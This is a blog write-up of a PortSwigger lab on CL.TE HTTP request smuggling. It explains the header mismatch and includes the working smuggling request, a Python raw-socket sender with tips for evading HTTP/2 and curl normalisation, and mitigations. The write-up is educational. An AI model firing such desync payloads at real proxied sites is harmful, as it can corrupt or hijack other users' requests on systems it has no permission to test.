---
layout: post
title: "PortSwigger: HTTP Request Smuggling, Basic CL.TE Vulnerability"
date: 2027-09-05 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, http-request-smuggling, cl-te, desync, transfer-encoding, content-length, gpost, cwe-444]
---

A web app behind a proxy needs the front-end and back-end to agree on where each HTTP request ends. When they don't, leftover bytes from one request become the start of the next — *HTTP request smuggling*. This is the foundational **CL.TE** lab: we smuggle a single stray byte, `G`, and watch the next request's `POST` method turn into the invalid `GPOST`.

## Overview

The front-end honors `Content-Length`; the back-end honors `Transfer-Encoding: chunked`. That mismatch is the entire bug. We exploit it by leaving a lone `G` buffered on the back-end so the *next* request's method becomes `GPOST`, producing the error `"Unrecognized method GPOST"`.

- **Vuln class:** HTTP request smuggling (CL.TE)
- **CWE:** [CWE-444 — Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

## Background: two ways to say "how long is the body"

HTTP/1.1 lets a request body declare its length two different ways:

- **`Content-Length:`** — a plain byte count.
- **`Transfer-Encoding: chunked`** — the body is sent in chunks and terminated by a zero-size chunk (`0\r\n\r\n`).

If a request carries **both**, two servers can pick different ones and disagree on where the request ends. Here:

- **Front-end → `Content-Length`**
- **Back-end → `Transfer-Encoding`**

That is the textbook **CL.TE** setup.

## The exploit

Send this request — twice:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The body is exactly six bytes: `0\r\n\r\nG`.

- **Front-end** reads `Content-Length: 6` → "the body is all 6 bytes" → forwards the lot.
- **Back-end** reads `Transfer-Encoding: chunked` → sees `0\r\n\r\n` (a zero-size chunk = end of body) → stops, leaving the trailing `G` sitting in its buffer.

The back-end reuses its connection to the front-end, so when the **next** request arrives down that pooled connection, the orphaned `G` is glued to its front:

```
G  +  POST / HTTP/1.1...   →   GPOST / HTTP/1.1...
```

`GPOST` is not a valid HTTP method, so the back-end answers:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 27

"Unrecognized method GPOST"
```

That error is the success condition — and the lab flips to **Solved**.

## Confirming it live

Firing the request repeatedly shows the textbook alternating desync. Each send plants the `G` that breaks the *next* request:

```
fire 0: HTTP/1.1 200 OK        <- plants G
fire 1: HTTP/1.1 403 Forbidden <- next request became GPOST
fire 2: HTTP/1.1 200 OK
fire 3: HTTP/1.1 403 Forbidden
```

A minimal raw-socket sender (Burp Repeater works too — just send the tab twice):

```python
import socket, ssl
HOST = "YOUR-LAB-ID.web-security-academy.net"
req = ("POST / HTTP/1.1\r\n"
       f"Host: {HOST}\r\n"
       "Connection: keep-alive\r\n"
       "Content-Type: application/x-www-form-urlencoded\r\n"
       "Content-Length: 6\r\n"
       "Transfer-Encoding: chunked\r\n"
       "\r\n0\r\n\r\nG").encode()

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(["http/1.1"])   # <-- critical, see gotcha #1
for i in (1, 2):
    s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)
    s.sendall(req)
    print(i, s.recv(4096).split(b"\r\n")[0].decode())
    s.close()
```

## Two gotchas worth remembering

1. **Force HTTP/1.1.** Against an HTTPS target your TLS library may negotiate **HTTP/2**, which frames length itself and has no `Content-Length`/`Transfer-Encoding` ambiguity — so the desync can't happen and you get a plain `403` that *looks* like "not vulnerable". Pin the TLS ALPN to `http/1.1` (`ctx.set_alpn_protocols(["http/1.1"])`).
2. **curl can't do this.** curl normalises/strips a request carrying both length headers, so the conflict never reaches the wire. Use a raw socket (or Burp).

## Why it worked

The whole attack is **two servers, one byte stream, two different length authorities.** Neither server is wrong in isolation — they simply disagree, and the attacker lives in that gap. Whatever is left over from request *N* becomes the start of request *N+1*.

## The fix

Make the front-end and back-end agree on one length mechanism:

- **Reject** any request that contains both `Content-Length` and `Transfer-Encoding`.
- Normalise/strip one header at the front-end before forwarding.
- Best: speak **HTTP/2 end-to-end** (no downgrade), where message length is unambiguous.
